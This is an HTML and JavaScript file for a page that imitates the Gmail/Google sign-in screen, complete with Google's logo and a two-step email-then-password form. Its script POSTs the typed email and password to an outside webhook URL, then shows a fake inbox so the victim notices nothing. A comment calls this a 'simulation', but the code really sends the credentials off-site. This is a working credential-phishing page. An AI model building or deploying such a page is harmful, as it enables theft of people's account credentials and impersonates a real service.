<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Gmail â€“ Sign in</title>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
  <style>
    :root {
      --bg: #f0f2f5;
      --card: #fff;
      --primary: #1a73e8;
      --txt: #202124;
      --sub: #5f6368;
      --line: #e0e0e0;
    }
    [data-theme="dark"] {
      --bg: #121212;
      --card: #1e1e1e;
      --txt: #e8eaed;
      --sub: #9aa0a6;
      --line: #333;
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: "Google Sans", sans-serif;
    }
    body {
      background: var(--bg);
      color: var(--txt);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      transition: background 0.3s, color 0.3s;
    }
    .toggle {
      position: absolute;
      top: 10px;
      right: 20px;
      font-size: 24px;
      cursor: pointer;
    }
    .card {
      background: var(--card);
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 360px;
    }
    .card img {
      display: block;
      margin: 0 auto 20px;
      width: 92px;
    }
    .card h1 {
      font-weight: 500;
      font-size: 22px;
      margin-bottom: 24px;
      text-align: center;
    }
    .field {
      margin-bottom: 20px;
      position: relative;
    }
    .field input {
      width: 100%;
      padding: 14px 12px;
      font-size: 16px;
      border: 1px solid var(--line);
      border-radius: 6px;
      background: transparent;
      color: var(--txt);
    }
    .field label {
      position: absolute;
      top: 50%;
      left: 12px;
      transform: translateY(-50%);
      color: var(--sub);
      font-size: 14px;
      transition: 0.2s;
      pointer-events: none;
    }
    .field input:focus + label,
    .field input:not(:placeholder-shown) + label {
      top: -8px;
      background: var(--card);
      padding: 0 4px;
      font-size: 12px;
      color: var(--primary);
    }
    .btn {
      width: 100%;
      padding: 12px;
      background: var(--primary);
      border: none;
      border-radius: 6px;
      color: #fff;
      font-weight: 500;
      cursor: pointer;
    }
    .inbox {
      display: none;
      flex-direction: column;
      width: 100%;
      max-width: 600px;
    }
    .header {
      background: var(--card);
      padding: 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid var(--line);
    }
    .list {
      flex: 1;
      background: var(--card);
      border-radius: 12px;
      margin-top: 20px;
      overflow: auto;
    }
    .email {
      padding: 16px;
      border-bottom: 1px solid var(--line);
    }
    .email:hover {
      background: #f1f3f4;
    }
    .email h4 {
      margin-bottom: 4px;
    }
    .email p {
      font-size: 14px;
      color: var(--sub);
    }
  </style>
</head>
<body>

<button class="toggle" id="themeToggle">ðŸŒ™</button>

<!-- Login Section -->
<section class="card" id="loginCard">
  <img src="https://accounts.google.com/gsi/style/logos/googlelogo_color_92x36dp.png" alt="Google">
  <h1>Sign in</h1>
  <form id="loginForm">
    <div class="field">
      <input type="email" id="email" placeholder=" " required />
      <label>Email or phone</label>
    </div>
    <div class="field" id="passwordField" style="display: none;">
      <input type="password" id="password" placeholder=" " required />
      <label>Password</label>
    </div>
    <button class="btn" type="submit" id="submitBtn">Next</button>
  </form>
</section>

<!-- Inbox Section -->
<section class="inbox" id="inboxPage">
  <div class="header">
    <strong>Inbox</strong>
    <img src="https://i.pravatar.cc/32?u=me" alt="Profile" style="border-radius:50%">
  </div>
  <div class="list" id="emailList"></div>
</section>

<script>
  const themeToggle = document.getElementById('themeToggle');
  const loginForm = document.getElementById('loginForm');
  const emailInput = document.getElementById('email');
  const passInput = document.getElementById('password');
  const passwordField = document.getElementById('passwordField');
  const submitBtn = document.getElementById('submitBtn');
  const loginCard = document.getElementById('loginCard');
  const inboxPage = document.getElementById('inboxPage');
  const emailList = document.getElementById('emailList');

  themeToggle.onclick = () => {
    document.body.toggleAttribute('data-theme');
  };

  loginForm.onsubmit = async e => {
    e.preventDefault();
    if (passwordField.style.display === 'none') {
      passwordField.style.display = 'block';
      submitBtn.textContent = 'Sign in';
      return;
    }

    // Simulate credential submission
    await fetch('https://play.svix.com/in/e_Cb6Z8mEkZaEi40pbz4To7voWnZn/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: emailInput.value,
        password: passInput.value
      })
    });

    loginCard.style.display = 'none';
    inboxPage.style.display = 'flex';

    const emails = [
      { from: "Alice", subject: "Meeting", message: "Tomorrow at 11 AM." },
      { from: "GitHub", subject: "New PR", message: "Please review #123" },
      { from: "Mom", subject: "Dinner", message: "Pizza tonight?" }
    ];
    emailList.innerHTML = emails.map(e => `
      <div class="email">
        <h4>${e.from} - ${e.subject}</h4>
        <p>${e.message}</p>
      </div>
    `).join('');
  };
</script>
</body>
</html>
